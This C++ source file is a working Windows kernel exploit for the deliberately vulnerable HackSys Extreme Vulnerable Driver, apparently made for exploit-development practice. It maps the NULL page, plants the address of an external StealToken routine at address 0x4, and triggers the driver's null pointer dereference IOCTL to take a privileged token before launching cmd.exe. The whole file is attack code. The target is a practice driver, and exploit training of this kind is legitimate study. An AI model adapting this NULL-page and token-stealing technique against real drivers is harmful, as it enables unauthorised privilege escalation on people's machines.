#include <Windows.h>
// #include <ntdef.h>
#include <stdio.h>

#define HACKSYS_EVD_IOCTL_NULL_POINTER_DEREFERENCE 0x22202B

extern "C" void StealToken();

typedef NTSTATUS(WINAPI* PNtAllocateVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    ULONG ZeroBits,
    PULONG AllocationSize,
    ULONG AllocationType,
    ULONG Protect
    );

int main()
{
    // Create handle to driver
    HANDLE device = CreateFileA(
        "\\\\.\\HackSysExtremeVulnerableDriver",
        GENERIC_READ | GENERIC_WRITE,
        0,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED,
        NULL);

    if (device == INVALID_HANDLE_VALUE)
    {
        printf("[-] Failed to open handle to device.");
        return -1;
    }

    // Get function NtAllocateVirtualMemory address
    HMODULE ntdll = GetModuleHandle(L"ntdll.dll");
    if (ntdll == NULL) {
        printf("[-] Failed to get handle of ntdll.dll.\n");
        exit(-1);
    }

    PNtAllocateVirtualMemory NtAllocateVirtualMemory =
        (PNtAllocateVirtualMemory)GetProcAddress(ntdll, "NtAllocateVirtualMemory");
    if (NtAllocateVirtualMemory == NULL) {
        printf("[-] Failed to export NtAllocateVirutalMemory.\n");
        exit(-1);
    }
    printf("[+] Found address of NtAllocateVirtualMemory: %p.\n", NtAllocateVirtualMemory);

    // Allocate NULL page
    LPVOID baseAddress = (LPVOID)0x1;
    ULONG allocSize = 0x1000;
    NTSTATUS status = NtAllocateVirtualMemory(
        GetCurrentProcess(),
        &baseAddress,
        0,
        &allocSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );
    printf("status: %x.\n", status);

    DWORD dummy;
    if (!VirtualProtect(0x0, 0x1000, PAGE_EXECUTE_READWRITE, &dummy)) {
        printf("[-] Failed to allocate the NULL page.\n");
        exit(-1);
    }
    printf("[+] Successfully allocate the NULL page.\n");

    *(PULONG32)(0x4) = (ULONG32)StealToken;

    char* driverBuffer = (char*)VirtualAlloc(
        NULL,
        0x100,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE);

    if (DeviceIoControl(
        device,
        HACKSYS_EVD_IOCTL_NULL_POINTER_DEREFERENCE,
        driverBuffer,
        0x100,
        NULL,
        0,
        &dummy,
        NULL
    )) {
        printf("[+] Done! Spawn a shell shortly.\n\n");
        system("cmd.exe");
    }
    else {
        printf("[-] Try again.\n");
    }

    return 0;
}